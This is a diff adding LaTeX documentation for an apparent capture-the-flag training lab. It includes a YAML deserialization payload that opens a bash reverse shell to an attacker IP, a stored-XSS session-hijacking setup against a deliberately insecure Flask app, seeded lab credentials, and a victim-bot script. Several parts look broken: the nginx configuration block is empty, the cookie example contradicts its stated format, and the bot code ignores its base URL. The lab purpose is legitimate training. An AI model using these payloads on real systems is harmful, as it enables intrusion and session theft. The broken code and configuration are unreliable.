+Or manually create \texttt{exploit.yml}:
+
+\begin{lstlisting}
+!!python/object/apply:os.system
+- "bash -c 'bash -i >& /dev/tcp/10.0.40.x/4444 0>&1'"
+\end{lstlisting}
+
+\subsubsection{Step 3 --- Upload and trigger}
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\tightlist
+\item
+  Browse to \path{http://192.168.30.x} --- login as \texttt{operator\ /\ D4t4V4ult\#2024}
+\item
+  Upload \texttt{exploit.yml} via the upload form
+\item
+  Click \textbf{Preview} on \texttt{exploit.yml}
+\item
+  Reverse shell arrives on the \texttt{nc} listener
+\end{enumerate}
+
+\subsubsection{Step 4 --- Exfiltrate the flag}
+
+\begin{lstlisting}
+# In the reverse shell:
+cat /app/data/finalData.txt
+\end{lstlisting}
+
+Returns \texttt{FLAG} --- \textbf{FLAG \#3}
+
+\subsection{Flag location}
+
+{\footnotesize\begin{longtable}[]{@{}
+  >{\raggedright\arraybackslash}p{0.30\linewidth}
+  >{\raggedright\arraybackslash}p{0.30\linewidth}
+  >{\raggedright\arraybackslash}p{0.30\linewidth}@{}}
+\toprule\noalign{}
+\begin{minipage}[b]{\linewidth}\raggedright
+Flag
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Location
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+How to reach
+\end{minipage} \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+FLAG & \path{/app/data/finalData.txt} (inside container) & Reverse shell via YAML deserialization \\
+\end{longtable}}
+
+\section{LAB2 -- Flask Application (Synapse)}
+
+The \texttt{flask} container runs \textbf{Synapse}, a minimal Python web application built with Flask 3.0. It is intentionally vulnerable and acts as the target for the XSS and session hijacking exercises.
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Network parameters}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
+  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
+\toprule\noalign{}
+Parameter & Value \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+Internal hostname & \texttt{flask} (Docker DNS) \\
+Internal port & \texttt{5000} \\
+Exposed via & nginx on port \texttt{80} \\
+\end{longtable}}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Key routes}
+
+{\footnotesize\begin{longtable}[]{@{}
+  >{\raggedright\arraybackslash}p{0.30\linewidth}
+  >{\raggedright\arraybackslash}p{0.30\linewidth}
+  >{\raggedright\arraybackslash}p{0.30\linewidth}@{}}
+\toprule\noalign{}
+\begin{minipage}[b]{\linewidth}\raggedright
+Route
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Auth required
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Description
+\end{minipage} \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+\path{/} & No & Redirects to \path{/login} \\
+\path{/login} & No & Login form --- POST authenticates the user \\
+\path{/logout} & No & Clears the session cookie \\
+\path{/comments} & No & Public comment wall --- \textbf{Stored XSS entry point} \\
+\path{/search} & Yes & Internal search --- \textbf{SQLi entry point} (Lab 2 ext.) \\
+\end{longtable}}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Session mechanism}
+
+Synapse identifies authenticated users with a plain-text cookie:
+
+\begin{lstlisting}
+session=<id>:<username>:<role>
+\end{lstlisting}
+
+Example for the \texttt{guest} user:
+
+\begin{lstlisting}
+session=2guest
+\end{lstlisting}
+
+The server reads this cookie on every request and trusts it unconditionally. There is no HMAC signing or server-side session store.
+
+\begin{lstlisting}
+The session cookie is issued \textbf{without} the `HttpOnly` attribute.
+Any JavaScript running in the page context can read it via `document.cookie`.
+This is the root cause that makes the XSS -> session hijack chain possible.
+\end{lstlisting}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Database}
+
+Synapse uses a SQLite database stored at \path{/opt/synapse/synapse.db}, persisted via the \texttt{synapse-db} Docker volume so data survives container restarts.
+
+Seeded users:
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}
+  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
+\toprule\noalign{}
+ID & Username & Password & Role \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+1 & \texttt{admin} & \texttt{admin123} & admin \\
+2 & \texttt{guest} & \texttt{guest123} & guest \\
+\end{longtable}}
+
+Comments table schema:
+
+\begin{lstlisting}
+CREATE TABLE comments (
+    id      INTEGER PRIMARY KEY AUTOINCREMENT,
+    author  TEXT,
+    content TEXT   -- rendered with |safe in Jinja2, no HTML escaping
+);
+\end{lstlisting}
+
+\begin{lstlisting}
+The comments template renders `content` with the `|safe` filter, which disables
+Jinja2's automatic HTML escaping. Any HTML or JavaScript inserted as a comment
+is rendered verbatim by the browser.
+\end{lstlisting}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Vulnerability surface}
+
+\begin{lstlisting}
+POST /comments
+  \---- content field (no sanitisation)
+        \---- stored raw in SQLite
+              \---- rendered with |safe in Jinja2 template
+                    \---- executed by every browser that loads /comments
+\end{lstlisting}
+
+The victim bot authenticates as \texttt{guest} and loads \path{/comments} every \textasciitilde20 s, providing a reliable and repeatable trigger for any stored payload.
+
+\section{LAB2 -- nginx Reverse Proxy}
+
+The \texttt{nginx} container is the only service with a port published to the host network. It receives all inbound HTTP traffic from the Attacker and forwards it to the Flask application using Docker's internal DNS.
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Network parameters}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
+  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
+\toprule\noalign{}
+Parameter & Value \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+Public IP & \texttt{192.168.30.x} \\
+Published port & \texttt{80} \\
+Upstream & \path{http://flask:5000} \\
+Config file path & \path{./nginx/default.conf} \\
+\end{longtable}}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Configuration}
+
+\begin{lstlisting}
+server 
+}
+\end{lstlisting}
+
+All requests are forwarded transparently to the \texttt{flask} container. No TLS is configured --- intentional for the lab environment.
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Connectivity verification}
+
+From the Attacker (Parrot):
+
+\begin{lstlisting}
+curl -v \url{http://192.168.30.x/login}
+# Expected: HTTP 200 with Synapse login page HTML
+\end{lstlisting}
+
+From inside the Docker host:
+
+\begin{lstlisting}
+curl -v http://localhost/login
+\end{lstlisting}
+
+\begin{lstlisting}
+Watch nginx access logs while running the exercise to confirm the victim bot
+is hitting `/comments` on schedule:
+
+```bash
+docker compose logs -f nginx
+```
+\end{lstlisting}
+
+\section{LAB2 -- Victim Bot (Playwright)}
+
+The \texttt{victim} container simulates an \textbf{authenticated user} who periodically browses the Synapse application. It removes the need for a second physical person to act as the victim --- the bot plays that role automatically and deterministically.
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Network parameters}
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
+  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
+\toprule\noalign{}
+Parameter & Value \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+Container name & \path{synapse_victim} \\
+Reaches & \path{http://nginx} (Docker DNS) \\
+Published ports & None --- internal only \\
+\end{longtable}}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Behaviour cycle}
+
+The bot runs \texttt{victim.py} in an infinite loop. Each iteration takes \textasciitilde30 s:
+
+{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
+  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
+\toprule\noalign{}
+Step & Action \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+1 & Navigate to \path{http://nginx/login} \\
+2 & Fill username \texttt{guest} / password \texttt{guest123} and submit \\
+3 & Print cookies obtained after login \\
+4 & Navigate to \path{http://nginx/comments} \\
+5 & Hold the page open for \textbf{8 seconds} --- XSS fires here \\
+6 & Sleep 20 seconds, then repeat \\
+\end{longtable}}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Source code}
+
+\begin{lstlisting}
+import time
+from playwright.sync_api import sync_playwright
+
+BASE = "http://nginx"
+USER = "guest"
+PASS = "guest123"
+
+def run():
+    with sync_playwright() as p:
+        browser = p.chromium.launch(headless=True)
+        context = browser.new_context()
+        page = context.new_page()
+
+        while True:
+            try:
+                page.goto(f"/login", wait_until="networkidle")
+                page.fill('input[name="username"]', USER)
+                page.fill('input[name="password"]', PASS)
+                page.click('button[type="submit"]')
+                page.wait_for_timeout(2000)
+
+                page.goto(f"/comments", wait_until="networkidle")
+                page.wait_for_timeout(8000)   # XSS payload executes here
+
+            except Exception as e:
+                print("victim error:", e)
+
+            time.sleep(20)
+
+if __name__ == "__main__":
+    run()
+\end{lstlisting}
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Why the victim triggers the XSS}
+
+When the bot loads \path{/comments}, Chromium renders the full page HTML including any \texttt{\textless{}script\textgreater{}} tags stored in the comments table. At that moment the browser holds an active session cookie for \texttt{guest}, so \texttt{document.cookie} contains the value the attacker wants to steal.
+
+The 8-second \path{wait_for_timeout} gives the \texttt{fetch()} payload enough time to reach the attacker's listener before the page is navigated away.
+
+\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}
+
+\subsection{Monitoring}
+
+\begin{lstlisting}
+docker compose logs -f victim
+\end{lstlisting}
+
+Typical output during a normal cycle:
+
+\begin{lstlisting}
+[victim] visiting /login
+[victim] url after login: http://nginx/comments
+[victim] cookies after login: []
+[victim] visiting /comments
+[victim] url after comments: http://nginx/comments
+[victim] cookies before wait: []
+\end{lstlisting}
+
+\begin{lstlisting}
+Post the XSS comment first, then wait for the next cycle. The bot visits
+`/comments` every ~20 s. If the listener receives no request after 40 s,
+double-check that port `8000` on `10.0.40.5` is reachable from the Docker
+network and that the payload syntax is correct.
+
+
+Each iteration reuses the same browser context, so the session cookie persists
+across cycles without re-authenticating every time. If the container restarts,
+a fresh login cycle begins automatically.
+\end{lstlisting}
